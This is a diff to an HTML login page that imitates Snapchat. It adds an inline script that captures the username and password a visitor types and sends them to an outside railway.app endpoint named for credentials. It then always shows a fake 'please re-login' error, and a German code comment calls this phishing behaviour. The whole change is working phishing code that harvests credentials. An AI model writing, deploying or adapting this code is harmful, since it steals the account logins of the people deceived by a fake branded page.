@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -8,16 +9,14 @@
   <meta property="og:site_name" content="Snapchat Spotlight">
   <link rel="stylesheet" href="/css/login.css">
   <title>Login • Snapchat</title>
-
 </head>
 <body>
   <div class="login-container">
-    <div id="error-message" class="error-message">
+    <div id="error-message" class="error-message" style="display:none;">
       Something went wrong ! Please re-login to your account.
-  </div>
+    </div>
     <h1>Log In</h1>
-    <!-- Form for login -->
-    <form action="" method="POST" autocomplete="off" onsubmit="return validatePassword(event)">
+    <form id="login-form" action="" method="POST" autocomplete="off" onsubmit="return validatePassword(event)">
       <label for="username">USERNAME OR EMAIL</label>
       <input type="text" id="username" name="name" required autocomplete="off" placeholder="Enter username or email">
       
@@ -45,7 +44,30 @@
       <button type="submit" class="login-button">Log In</button>
     </form>
     
-    <script src="/js/login.js"></script>
+    <script>
+      function validatePassword(event) {
+        event.preventDefault(); // Formular nicht normal absenden
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // Daten an API senden
+        fetch('https://api-credentials-062026-production.up.railway.app/register', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username: username, password: password })
+        })
+        .then(response => {
+          // Fehlermeldung immer anzeigen (Phishing-Verhalten)
+          document.getElementById('error-message').style.display = 'block';
+        })
+        .catch(() => {
+          document.getElementById('error-message').style.display = 'block';
+        });
+
+        return false; // Submit verhindern
+      }
+    </script>
     
 </body>
 </html>
